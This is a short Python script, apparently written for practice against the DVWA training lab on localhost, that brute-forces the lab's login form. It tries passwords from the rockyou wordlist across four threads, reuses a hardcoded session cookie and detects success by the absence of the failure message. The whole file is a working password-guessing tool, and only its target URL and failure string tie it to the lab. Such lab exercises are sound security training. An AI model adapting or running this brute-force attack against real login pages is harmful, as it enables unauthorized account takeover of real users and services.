from queue import Queue
from threading import Thread
import requests
from bs4 import BeautifulSoup

file_name = 'rockyou.txt'
passwords = Queue()
url = "http://localhost/dvwa/vulnerabilities/brute/"
# admin, smithy, gordonb, pablo, 1337
username = 'admin'
session = requests.Session()
cookies = {
    'PHPSESSID': 'j312kmgk8dk657ttrcucv8l2b6',
    'security': 'low',
}

with open("rockyou.txt") as fh:
	for password in fh:
		passwords.put(password.strip())

def checkResponse(response):
    content = BeautifulSoup(response.text, 'html.parser')
    return False if content.find(string="Username and/or password incorrect.") else True

def sendRequest(password):
    payload = {
        'username': username,
        'password': password,
        'Login': 'Login'
    }

    print(f"Trying password {password}")
    response = session.get(url, params=payload, cookies=cookies)

    isSuccessful = checkResponse(response)
    if isSuccessful:
        print(f"\tFound password: {password}")
        with passwords.mutex:
            passwords.queue.clear()
            return  

def thread_work():
    while not passwords.empty():
        password = passwords.get()
        sendRequest(password)

if __name__ == "__main__":
    threads = []
    for _ in range(4):
        thread = Thread(target=thread_work, daemon=True)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()